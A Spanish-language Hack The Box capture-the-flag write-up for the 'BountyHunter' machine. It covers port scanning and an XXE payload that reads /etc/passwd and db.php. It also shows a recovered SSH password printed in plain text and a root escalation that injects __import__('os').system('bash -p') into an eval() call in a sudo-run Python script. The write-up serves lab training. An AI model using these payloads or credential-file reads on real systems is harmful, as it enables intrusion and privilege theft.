---
layout: single
title: Bounty Hunter - Hack The Box
excerpt: "BountyHunter es una pagina facil donde debemos usar y explotar una vulnerabilidad XXE para obtener archivos que nos ayudan a obtener credenciales y conectarnos por SSH. Para la escalada de privilegios necesitaremos analizar un archivo en Python que es ejecutado como root, donde deberemos aprovecharnos del uso de la funcion 'eval' para ejecutar comandos."
date: 2022-04-13
classes: wide
header:
  teaser: /assets/images/htb-writeup-bountyhunter/bountyhunter_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - xxe
  - python-analysis
---

![](/assets/images/htb-writeup-bountyhunter/bountyhunter_logo.png)

BountyHunter es una pagina facil donde debemos usar y explotar una vulnerabilidad XXE para obtener archivos que nos ayudan a obtener credenciales y conectarnos por SSH. Para la escalada de privilegios necesitaremos analizar un archivo en Python que es ejecutado como root, donde deberemos aprovecharnos del uso de la funcion 'eval' para ejecutar comandos.

## Escaneo de puertos

Ya que estamos en ambientes controlados, aprovecharemos de utilizar todo el poder de Nmap para el escaneo de puertos. 
El escaneo de puertos lo haremos en dos pasos:
1. Descubrimiento de puertos: Obtendremos los puertos abiertos del objetivo
2. Escaneo enfocado a los puertos abiertos: Obtendremos mas informacion de cada puerto descubierto por el paso anterior.

Para esto, utilizaremos los siguientes comandos:
```bash
nmap -p- -sS --min-rate 5000 -Pn -n 10.129.145.92 -v -oA ports
nmap -p 22,80 10.129.145.92 -sC -sV -oA targeted
```

![](/assets/images/htb-writeup-bountyhunter/1.png)

```plaintext
Nmap scan report for 10.129.95.166
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Website

Gracias al escaneo realizado, vemos que existe un servicio SSH y un Website en el puerto 80.

![](/assets/images/htb-writeup-bountyhunter/2.png)

Al hacer explorar un poco la pagina, nos dirigimos a "Portal"

![](/assets/images/htb-writeup-bountyhunter/3.png)

Hicimos click en "here".

![](/assets/images/htb-writeup-bountyhunter/4.png)

Antes de meter manos y tratar de explotar, es importante ver que es lo que hace en su funcionamiento normal.

![](/assets/images/htb-writeup-bountyhunter/5.png)

![](/assets/images/htb-writeup-bountyhunter/6.png)

## XXE

Al ver las peticiones realizadas al momento de realizar "submit", nos dimos cuenta que envia un POST con un parametro "data", el cual esta en base64. Al decodear este base64, tiene sintaxis XML, donde uno de sus valores entregados, es la palabra "test" que le enviamos, que a su vez, esta siendo reflejado en la respuesta.

![](/assets/images/htb-writeup-bountyhunter/7.png)

Modificamos la peticion, donde mediante el uso de External Entity, leemos el archivo `/etc/passwd`, el cual aplicamos un wrapper de php para encodear en base64 el archivo, en caso de existir.

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe></cwe>
		<cvss></cvss>
		<reward></reward>
		</bugreport>
```

![](/assets/images/htb-writeup-bountyhunter/8.png)

Obtuvimos el `/etc/passwd` exitosamente de la victima y le aplicamos un `grep sh$` para que solo nos muestre las lineas que termine con "sh"

![](/assets/images/htb-writeup-bountyhunter/9.png)

Luego de intentar obtener otros archivos (llaves ssh, logs, etc) que nos pudiesen ayudar a obtener acceso a una consola de comandos en la victima, hicimos un fuzzing de directorios, buscando archivos que pudiesemos leer con el XXE descubierto.

```bash
dirsearch -u http://10.129.95.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e html,txt,php -t 150 -f 
```

![](/assets/images/htb-writeup-bountyhunter/10.png)

```plaintext
Target: http://10.129.95.166/

[11:05:05] Starting: 
[11:05:09] 403 -  278B  - /icons/                                          
[11:05:10] 301 -  318B  - /resources  ->  http://10.129.95.166/resources/  
[11:05:10] 200 -    3KB - /resources/                                      
[11:05:13] 200 -   25KB - /index.php                                       
[11:05:15] 403 -  278B  - /assets/                                         
[11:05:15] 301 -  315B  - /assets  ->  http://10.129.95.166/assets/
[11:05:15] 200 -  125B  - /portal.php                                      
[11:05:17] 301 -  312B  - /css  ->  http://10.129.95.166/css/              
[11:05:17] 403 -  278B  - /css/                                            
[11:05:20] 200 -    0B  - /db.php                                          
[11:05:21] 301 -  311B  - /js  ->  http://10.129.95.166/js/                
[11:05:21] 403 -  278B  - /js/
```

Observamos que existe un archivo "db.php", el cual al momento de hacer un GET al archivo, no obtenemos nada, ya que probablemente solo tenga variables y/o funciones para que sean utilizadas por otros archivos.
Obtuvimos el archivo "db.php" con el XXE Descubierto.

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe></cwe>
		<cvss></cvss>
		<reward></reward>
		</bugreport>
```

![](/assets/images/htb-writeup-bountyhunter/11.png)

Obtuvimos el contenido de `db.php` y observamos una contraseña.

![](/assets/images/htb-writeup-bountyhunter/12.png)

Realizamos reutilizacion de credenciales (en este caso password) para conectarnos a traves de SSH con el usuario descubierto anteriormente al obtener el contenido del archivo `/etc/passwd`

ssh development@10.129.95.166
m19RoAU0hP41A1sTsq6K

![](/assets/images/htb-writeup-bountyhunter/13.png)

## Escalada de privilegios

Una de las primeras verificaciones que realizamos es el siguiente comando
```bash
sudo -l
```

Vemos que podemos ejecutar un script en python como root. 

![](/assets/images/htb-writeup-bountyhunter/14.png)

```plaintext
User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

Observamos el contenido de este script.

```bash
cat /opt/skytrain_inc/ticketValidator.py
```

![](/assets/images/htb-writeup-bountyhunter/15.png)

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

Al analizar el script que podemos ejecutar como root, observamos una linea que nos serviria para ejecutar comandos:
```python
validationNumber = eval(x.replace("**", ""))
```

Sin embargo, para llegar a esta linea del script, es necesario:
1. Crear un archivo con extension '.md'
2. La primera linea debe empezar con `# Skytrain Inc`
3. La segunda linea debe empezar con `## Ticket to x`
4. La tercera linea debe empezar con `__Ticket Code:__`
5. La cuarta linea debe empezar con `**`, seguido de un numero que al dividir por 7, el modulo debe ser 4.

Cumpliendo todo lo anterior, podriamos ejecutar el script correctamente y llegar a la linea que nos interesa.
Lamentablemente el script no realiza ningun "import" que nos ayude a ejecutar comandos de sistema directamente ('os', 'subprocess'), sin embargo, podemos solucionar esto sencillamente en un oneliner: `__import__('os').system("echo hola")`

![](/assets/images/htb-writeup-bountyhunter/15_1.png)

La funcion "eval" de python tiene varias utilidades, sin embargo, es muy insegura, mas si dejas alguna variable controlada por el usuario dentro de esta funcion.

![](/assets/images/htb-writeup-bountyhunter/15_2.png)

![](/assets/images/htb-writeup-bountyhunter/15_3.png)

Nuestro archivo de prueba, el cual ejecutara el comando 'id', queda de la siguiente forma:

test.md:
```MarkDown
# Skytrain Inc
## Ticket to f0xtty
__Ticket Code:__
**11+__import__('os').system('id')
```

![](/assets/images/htb-writeup-bountyhunter/16.png)

```bash
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```
test.md

![](/assets/images/htb-writeup-bountyhunter/17.png)

Ya que confirmamos que podemos ejecutar comandos como root, cambiamos el comando 'id' por 'bash -p' y nuestro archivo final queda asi:

test.md:
```MarkDown
# Skytrain Inc
## Ticket to f0xtty
__Ticket Code:__
**11+__import__('os').system('bash -p')
```

![](/assets/images/htb-writeup-bountyhunter/18.png)

```bash
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```
test.md

![](/assets/images/htb-writeup-bountyhunter/19.png)
